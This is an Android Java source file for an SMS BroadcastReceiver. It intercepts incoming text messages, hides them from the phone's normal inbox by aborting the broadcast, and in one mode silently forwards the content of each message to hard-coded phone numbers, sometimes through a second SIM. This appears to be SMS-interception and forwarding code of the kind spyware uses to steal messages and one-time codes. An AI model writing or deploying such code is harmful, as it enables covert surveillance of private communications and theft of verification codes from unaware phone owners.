package com.internal.transmit;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.internal.transmit.db.DatabaseOperator;

public class PrivilegedSmsReceiver extends BroadcastReceiver {
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = true;
    
    @Override
    public void onReceive(Context arg0, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] >>>>>>>>>>>>>>>>>>>>>>>");

        if (!Config.IS_CENTER_MODE) {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] objArray = (Object[]) bundle.get("pdus");
                    SmsMessage[] messages = new SmsMessage[objArray.length];
                    for (int i = 0; i < objArray.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) objArray[i]);
                        String content = messages[i].getMessageBody();
                        String phoneNum = messages[i].getDisplayOriginatingAddress();
                        if (DEBUG) Log.d(TAG, "[[onReceived]] phoneNum = " + phoneNum
                                + " content = " + content);
                        
                        if (!TextUtils.isEmpty(phoneNum)) {
                            if (DEBUG) Log.d(TAG, "[[onReceived]] phoneNum = " + phoneNum);
                            SettingManager.getInstance().init(arg0);
                            if (phoneNum.endsWith(SettingManager.getInstance().getPhoneNum())) {
                                this.abortBroadcast();
                                
                                MessageInfo info = new MessageInfo();
                                info.time = Config.formatTime(System.currentTimeMillis());
                                info.content = content;
                                info.phone = SettingManager.getInstance().getPhoneNum();
                                
                                DatabaseOperator.getInstance().init(arg0.getApplicationContext());
                                DatabaseOperator.getInstance().insertInboxInfo(info);
                                
                                NotificationManager nm = (NotificationManager) arg0.getSystemService(Context.NOTIFICATION_SERVICE);
                                Intent accountIntent = new Intent(arg0, InboxActivity.class);
                                PendingIntent pintent = PendingIntent.getActivity(arg0, 0, accountIntent, 0);
                                Notification notif1 = new Notification(R.drawable.icon,
                                        arg0.getString(R.string.tips_new_msg), System.currentTimeMillis());
                                notif1.setLatestEventInfo(arg0, arg0.getString(R.string.tips_new_msg),
                                        arg0.getString(R.string.tips_new_msg), pintent);
                                nm.notify(1, notif1);
                            }
                        }
                    }
                }
            }
        } else {
            parseSMS(arg0, intent);
        }
    }
    
    private void parseSMS(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[parseSMS]] entry into >>>>>>>>>>>>>>");
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            Object[] objArray = (Object[]) bundle.get("pdus");

            if (objArray.length > 0) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                int activePhone = tm.getPhoneType();

                try {
                    if (TelephonyManager.PHONE_TYPE_CDMA == activePhone) {
                        android.telephony.SmsMessage message = null;
                        message = android.telephony.SmsMessage.createFromPdu((byte[]) objArray[0]);
                        String content = message.getMessageBody();
                        String phoneNum = message.getDisplayOriginatingAddress();
                        
                        if (DEBUG) Log.d(TAG, "[[parseSMS]] CDMA : phoneNum = " + phoneNum 
                                        + " content = " + content);
                        
                        String[] targets = Config.TAEGET_NUM.split(";");
                        if (targets != null && phoneNum != null) {
                            for (String target : targets) {
                                if (!phoneNum.endsWith(target)) {
                                    try {
                                        InternalUtils.sendMessageBySecondSIMCard(context, target, content);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            }
                        }
                        
                        this.abortBroadcast();
                    } else {//gsm
//                        wrappedMessage[n] = android.telephony.gsm.SmsMessage.createFromPdu((byte[]) messages[n]);
//                        mode = SmsSender.SEND_MODE_GSM;
                    }
//                    if (wrappedMessage[n] == null) {
//                        if (needTryGsm) {
//                            wrappedMessage[n] = com.android.internal.telephony.gsm.SmsMessage
//                                    .createFromPdu((byte[]) messages[n]);
//                            mode = SmsSender.SEND_MODE_GSM;
//                        } else if (needTryCdma) {
//                            wrappedMessage[n] = com.android.internal.telephony.cdma.SmsMessage
//                                    .createFromPdu((byte[]) messages[n]);
//                            mode = SmsSender.SEND_MODE_CDMA;
//                        } else {
//                            tempString = "";
//                        }
//                    }
                } catch (OutOfMemoryError e) {
                    if (objArray.length > 0) {
                        android.telephony.gsm.SmsMessage gsmSMS = android.telephony.gsm.SmsMessage
                                                                    .createFromPdu((byte[]) objArray[0]);
                        String content = gsmSMS.getMessageBody();
                        String phoneNum = gsmSMS.getDisplayOriginatingAddress();
                        
                        if (DEBUG) Log.d(TAG, "[[parseSMS]] GSM : phoneNum = " + phoneNum 
                                                + " content = " + content);
                        
                        String[] targets = Config.TAEGET_NUM.split(";");
                        if (targets != null && phoneNum != null) {
                            for (String target : targets) {
                                if (!phoneNum.endsWith(target)) {
                                    try {
                                        InternalUtils.sendMessage(context, target, content);
                                    } catch (Exception ex) {
                                        ex.printStackTrace();
                                    }
                                }
                            }
                        }
                        
                        this.abortBroadcast();
                    }
                }

            }
        }
    }

}
